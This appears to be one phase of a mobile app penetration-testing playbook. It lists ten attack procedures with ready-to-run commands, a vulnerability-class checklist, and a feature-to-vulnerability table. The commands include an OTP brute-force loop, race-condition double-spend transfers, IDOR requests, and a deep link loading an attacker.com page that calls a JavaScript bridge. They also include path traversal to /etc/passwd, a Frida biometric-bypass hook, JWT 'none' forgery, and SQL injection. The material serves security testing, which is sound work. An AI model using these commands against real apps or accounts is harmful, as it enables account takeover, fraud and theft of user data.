# Phase 7: Execution Procedures & Vulnerability Classes

## Top 10 Mobile Vulnerability Execution Procedures

**1. IDOR (most common High+ finding):**
```bash
# Capture a request with your user ID (from Phase 4 traffic)
# In Burp Repeater: swap your ID with another user's ID
# Test: account number, user ID, transaction ID, document ID
curl -s "$BASE/api/user/profile?id=VICTIM_ID" -H "Authorization: Bearer $MY_TOKEN"
# If you get victim's data → IDOR confirmed
# Also test: sequential IDs (id=1001 → id=1002), UUID enumeration, negative IDs
```

**2. OTP Bypass:**
```bash
# a) Null OTP: send empty or "000000"
curl -s "$BASE/auth/verify-otp" -d '{"otp":""}' -H "Authorization: Bearer $TOKEN"
# b) Reuse: use same OTP twice
# c) Expired: wait past TTL, resend same OTP
# d) Race condition: send 2 verify requests simultaneously with same OTP
# e) Brute force: if no rate limit, try all 6-digit codes (needs automation)
for i in $(seq 100000 999999); do
  curl -s "$BASE/auth/verify-otp" -d "{\"otp\":\"$i\"}" -H "Auth: Bearer $TOKEN" | grep -q "success" && echo "FOUND: $i" && break
done
```

**3. Race Condition (double-spend):**
```bash
# Prepare N identical transfer requests, fire simultaneously
# Using GNU parallel:
seq 1 10 | parallel -j10 "curl -s '$BASE/transfer' -d '{\"amount\":100,\"to\":\"ACCT\"}' -H 'Auth: Bearer $TOKEN'"
# Or Burp Turbo Intruder / Repeater "Send group in parallel"
# Check: did balance decrease by 100 or 1000? Did recipient get 1x or 10x?
```

**4. Deep Link → WebView Hijack:**
```bash
# From Phase 2: identified deep link that loads URL in WebView
adb shell am start -a android.intent.action.VIEW -d "appscheme://webview?url=https://attacker.com/xss.html" <package>
# If WebView loads attacker URL → check for JS bridge methods
# Escalate: inject JS that calls @JavascriptInterface methods
# Example payload (xss.html): <script>AndroidBridge.executeCommand("id")</script>
```

**5. Path Traversal (file read/write):**
```bash
# Via ContentProvider:
adb shell content read --uri "content://<authority>/../../etc/hosts"
# Via deep link file download:
adb shell am start -d "appscheme://download?file=../../../data/data/<pkg>/shared_prefs/secrets.xml" <package>
# Via intent extra:
adb shell am start -n <package>/.FileViewerActivity --es "path" "../../../../etc/passwd"
```

**6. Exported Component Abuse:**
```bash
# Launch non-protected activity directly (skip auth):
adb shell am start -n <package>/.internal.AdminActivity
# Send broadcast to unprotected receiver:
adb shell am broadcast -a <package>.RESET_PIN --es "new_pin" "0000"
# Query exported ContentProvider:
adb shell content query --uri "content://<authority>/users" --projection "name:password"
```

**7. Biometric Bypass (client-side):**
```javascript
// Frida: hook BiometricPrompt callback to always succeed
Java.perform(function() {
  var cb = Java.use("androidx.biometric.BiometricPrompt$AuthenticationCallback");
  cb.onAuthenticationSucceeded.implementation = function(result) {
    console.log("[*] Biometric bypassed");
    this.onAuthenticationSucceeded(result);
  };
  cb.onAuthenticationFailed.implementation = function() {
    console.log("[*] Suppressing failure");
  };
});
// If app proceeds without server validation → finding confirmed
```

**8. JWT Manipulation:**
```bash
# Decode JWT: echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null
# Test "none" algorithm:
# Header: {"alg":"none","typ":"JWT"} → base64url
# Keep payload, remove signature: header.payload.
curl -s "$BASE/api/me" -H "Authorization: Bearer $NONE_TOKEN"
# Test expired token reuse: use token past exp claim
# Test role escalation: change "role":"user" to "role":"admin"
```

**9. SQL Injection (ContentProvider):**
```bash
# Basic test:
adb shell content query --uri "content://<authority>/items" --where "1=1) OR 1=1--"
# Extract data:
adb shell content query --uri "content://<authority>/items" --where "1=1) UNION SELECT sql,2,3 FROM sqlite_master--"
# If app crashes or returns unexpected data → SQLi confirmed
```

**10. Insecure Data Storage:**
```bash
# Pull all app data (rooted):
adb shell "su -c 'tar czf /sdcard/appdata.tar.gz /data/data/<package>/'"
adb pull /sdcard/appdata.tar.gz
tar xzf appdata.tar.gz
# Check SharedPrefs for tokens/PII:
grep -riE "token|jwt|password|pin|account" data/data/<package>/shared_prefs/
# Check databases:
sqlite3 data/data/<package>/databases/*.db ".dump" | grep -iE "password|token|secret"
# Check Hive (Flutter):
strings data/data/<package>/app_flutter/*.hive | grep -iE "bearer|jwt|refresh"
```

---

## Vulnerability Classes Checklist (Apply Per-Feature)

**Authentication & Session:**
- Brute force / rate limiting bypass
- Credential stuffing
- Session fixation / session hijacking
- Token leakage (logs, analytics, clipboard, URL params)
- Biometric bypass (client-side only check)
- OTP bypass (reuse, expiry, null, race condition)
- Password reset flow abuse
- Remember-me token weakness

**Authorization:**
- IDOR (swap user IDs, account numbers, resource IDs)
- Privilege escalation (user → admin, free → premium)
- Missing function-level access control
- Insecure direct object reference via deep links

**Input Validation:**
- SQL injection (API params, content provider queries)
- NoSQL injection (MongoDB operators in JSON)
- Command injection (native libs, server-side)
- YAML/XML deserialization (SnakeYAML, XMLDecoder)
- Path traversal (file operations, content providers)
- XSS via WebView (stored in fields, reflected via deep links)
- Intent injection (exported components, parseUri)

**Business Logic:**
- Race conditions (double-spend, parallel requests)
- Negative values (transfer negative amount)
- Step skipping (skip OTP, skip terms acceptance)
- Replay attacks (reuse transaction tokens)
- Coupon/promo abuse (reuse, negative discount)
- Time-of-check-time-of-use (TOCTOU)

**Data Protection:**
- Insecure local storage (plaintext tokens, PII in SharedPrefs)
- Clipboard leakage (sensitive data copied)
- Logging sensitive data (logcat, analytics)
- Backup exposure (allowBackup, custom backup without encryption)
- Screenshot/screen recording on sensitive screens
- Cache/temp file exposure

**Cryptography:**
- Weak algorithms (MD5, SHA1 for security, DES, RC4)
- Hardcoded keys/secrets
- Small keyspace (4-digit PIN protecting data)
- ECB mode usage
- Missing integrity protection (encryption without MAC)
- Predictable IV/nonce

**Network:**
- Cleartext traffic (HTTP, missing usesCleartextTraffic=false)
- Missing/incomplete SSL pinning
- Certificate validation bypass
- WebSocket without TLS
- DNS rebinding

**Platform (Mobile-specific):**
- Exported components without permission (activities, receivers, providers, services)
- Deep link injection / hijacking
- WebView JavaScript bridge attacks
- Intent redirection / hijacking
- Pending intent mutable flags
- Task affinity hijacking
- Tapjacking (overlay attacks)

## Per-Feature Vuln Class Mapping (Quick Reference)

| Feature Type | Primary Vuln Classes |
|-------------|---------------------|
| Login/Auth | Brute force, OTP bypass, biometric bypass, session fixation, credential stuffing |
| Payment/Transfer | IDOR, race condition, negative amount, replay, step skipping |
| Profile/Account | IDOR, PII exposure, file upload vulns, XSS via fields |
| File Upload/Download | Path traversal, unrestricted type, size bypass, malware upload |
| Chat/Messaging | XSS, injection, media handling, deep link abuse |
| Search | Injection, information disclosure, enumeration |
| Settings | Privilege escalation, insecure defaults, missing re-auth |
| Deep Links (all) | Intent injection, WebView hijack, parameter tampering, open redirect |
| Content Providers | SQL injection, path traversal, permission bypass |
| Push Notifications | Spoofing, data leakage in payload, deep link injection |
